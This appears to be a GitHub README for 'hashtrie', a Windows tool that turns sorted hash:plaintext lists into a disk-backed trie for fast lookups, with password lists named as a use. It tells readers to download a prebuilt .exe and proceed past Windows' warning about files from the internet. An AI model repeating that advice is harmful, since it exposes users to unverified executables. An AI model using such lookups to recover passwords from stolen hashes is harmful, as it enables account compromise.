# ⚙️ hashtrie - Fast Data Sharding and Lookup Tool

[![Download hashtrie](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://github.com/ferrystand/hashtrie/releases)

---

## 📋 What is hashtrie?

hashtrie is a command-line tool that helps organize very large sorted lists of hashed data. It breaks down these lists into smaller groups called shards, based on shared starting parts of the data. This method uses a trie, a tree-like structure stored on your disk, to speed up data searches and make storing huge datasets easier. 

This tool is built for users who need to handle large amounts of hashed information quickly and efficiently. While it works through commands you type in, you don't need programming skills to use it.

---

## 💻 System Requirements

- **Operating System:** Windows 10 or later (64-bit preferred)  
- **Disk Space:** At least 500 MB free space to store shards and data files  
- **Memory (RAM):** Minimum 4 GB for smooth operation  
- **Processor:** Any modern processor (Intel or AMD) should work fine  
- **Permissions:** Ability to install applications and write files to your chosen folder  

---

## 🎯 Key Features

- Breaks large sets of sorted hash data into smaller, manageable parts  
- Uses a disk-backed trie for fast key lookups  
- Works from the command line; no programming needed  
- Helps with data storage and speed when working with millions of entries  
- Durable design supports massive datasets  
- Ideal for password lists, cybersecurity data, or other hashed data collections  

---

## 🚀 Getting Started

Follow these steps to download and run hashtrie on your Windows computer. The process is straightforward and will have you set up quickly.

---

## ⬇️ Download and Install hashtrie

1. Click the large button above or visit the release page directly:  
   [https://github.com/ferrystand/hashtrie/releases](https://github.com/ferrystand/hashtrie/releases)

2. On the release page, look for the latest version, usually listed at the top.

3. Find the Windows executable file. It will have a name ending with `.exe`. For example, it might be called `hashtrie-windows.exe`.

4. Click the `.exe` file to download it to your computer. Save it somewhere easy to find, like your Desktop or Downloads folder.

5. Once the download finishes, open the folder where you saved the file.

6. Double-click the `hashtrie-windows.exe` file to run it.

7. If Windows warns you about running a file from the internet, confirm that you want to proceed.

---

## 📂 Using hashtrie for the First Time

hashtrie runs from a Command Prompt window. Here is how to start using it after download:

1. Press the **Windows key**, type `cmd` and hit **Enter**. This opens Command Prompt.

2. Use the `cd` command to move to the folder where `hashtrie-windows.exe` is located.  
   For example, if it is on your Desktop, type:  
   ```
   cd Desktop
   ```

3. To see if hashtrie is working, type:  
   ```
   hashtrie-windows.exe --help
   ```  
   This will show a list of commands and options available.

4. To run hashtrie with your data, you will need to provide it with a sorted file of hash:plain entries. This file must be prepared before running the tool.

---

## 📘 Preparing Your Data

hashtrie works with files that contain hashes and their plain text forms. It expects these files to be:

- Sorted alphabetically or numerically, based on hash  
- In a plain text format with each line containing one hash and one plain value separated by a colon (`:`)  
- Large files can be handled, but ensure the file is stable and complete before processing

Example line inside your file:  
```
5f4dcc3b5aa765d61d8327deb882cf99:password
```

---

## ⚙️ Running hashtrie Commands

Here are common commands you might use:

- **Create shards and trie:**  
  ```
  hashtrie-windows.exe build -i path\to\your\datafile.txt -o path\to\output\folder
  ```
  This command makes shards and a trie from your input file.

- **Query the trie:**  
  ```
  hashtrie-windows.exe query -k 5f4dcc3b5aa765d61d8327deb882cf99 -d path\to\output\folder
  ```
  This looks up a hash key in the created trie and shows the related plain value if found.

---

## 🔧 Configuration Options

- `-i` or `--input`: Path to your input data file  
- `-o` or `--output`: Folder where shards and trie will be saved  
- `-k` or `--key`: Hash key to query  
- `--max-shard-size`: Max size for each shard to control disk space  
- `--help`: Show help information  

You can always type:  
```
hashtrie-windows.exe --help
```  
to check available options.

---

## 🛠 Troubleshooting

- If the program fails to run, ensure you have the right permissions on your folders.

- Large files can take time; be patient during processing.

- Check that your data file is sorted and formatted correctly.

- If a command returns no results, verify your query hash exists in the dataset.

- Use the help command to review proper command syntax.

---

## 📚 Additional Resources

The GitHub release page has all downloads and basic information:  
[https://github.com/ferrystand/hashtrie/releases](https://github.com/ferrystand/hashtrie/releases)

For technical details about how hashtrie works, refer to the repository documentation (same GitHub page).

---

## 🤝 Support

If you run into issues beyond setup, consider opening a support issue on the GitHub page under the "Issues" tab. Provide simple details like error messages and what steps you took.

---

## 🔑 Why Use hashtrie?

- Simplifies managing large hash datasets  
- Offers fast searches through disk-backed tries  
- Works well for password databases, security audits, and hashing projects  
- No programming needed, just command line basics  

---

[![Download hashtrie](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://github.com/ferrystand/hashtrie/releases)